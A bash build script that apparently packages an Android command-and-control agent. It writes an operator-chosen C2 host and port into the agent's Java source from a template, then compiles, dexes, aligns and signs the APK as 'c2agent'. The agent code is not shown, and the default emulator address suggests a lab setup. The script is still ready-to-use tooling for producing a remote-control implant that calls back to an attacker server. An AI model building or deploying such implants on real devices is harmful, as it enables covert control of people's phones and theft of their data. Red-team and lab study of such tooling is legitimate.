#!/bin/bash
# Build C2 Agent APK
# Usage: ./build_apk.sh <HOST> <PORT>
# E.g.: ./build_apk.sh 10.0.2.2 4443
set -e

HOST=${1:-10.0.2.2}
PORT=${2:-4443}
C2=/tmp/c2agent
SDK="$HOME/Android/Sdk"
BT=$SDK/build-tools/36.1.0
PLAT=$SDK/platforms/android-36.1
OUT=$C2/build

rm -rf $OUT
mkdir -p $OUT/classes $OUT/dex $OUT/apk

# Replace C2_HOST and C2_PORT in template
sed "s|http://C2_HOST:C2_PORT|http://${HOST}:${PORT}|g" $C2/C2Service.java.template > $C2/C2Service.java

echo "[1/6] Compile resources (aapt2)"
$BT/aapt2 compile -o $OUT/resources.zip \
    $C2/res/values/strings.xml \
    $C2/res/values/themes.xml \
    $C2/res/layout/activity_main.xml \
    $C2/res/xml/network_security_config.xml 2>&1

echo "[2/6] Link APK"
$BT/aapt2 link -o $OUT/apk/unsigned.apk \
    -I $PLAT/android.jar \
    --manifest $C2/AndroidManifest.xml \
    --auto-add-overlay \
    -R $OUT/resources.zip 2>&1

echo "[3/6] Compile Java"
javac -d $OUT/classes \
    --release 8 \
    -cp $PLAT/android.jar \
    $C2/MainActivity.java \
    $C2/C2Service.java 2>&1

echo "[4/6] DEX"
$BT/d8 --lib $PLAT/android.jar \
    --min-api 24 \
    --output $OUT/dex \
    $OUT/classes/com/c2/agent/*.class 2>&1

echo "[5/6] Inject DEX + Align"
cd $OUT/dex && zip -q $OUT/apk/unsigned.apk classes.dex && cd /tmp
zipalign -p 4 $OUT/apk/unsigned.apk $OUT/apk/aligned.apk

echo "[6/6] Sign APK"
keytool -genkey -v -keystore $OUT/debug.keystore \
    -alias android -keyalg RSA -keysize 2048 -validity 10000 \
    -storepass android -keypass android \
    -dname "CN=Debug, O=Android, C=US" 2>/dev/null
apksigner sign --ks $OUT/debug.keystore \
    --ks-pass pass:android --key-pass pass:android \
    --ks-key-alias android \
    $OUT/apk/aligned.apk

cp $OUT/apk/aligned.apk $OUT/apk/c2agent-${HOST}.apk
echo "DONE: $OUT/apk/c2agent-${HOST}.apk"
ls -lh $OUT/apk/c2agent-${HOST}.apk
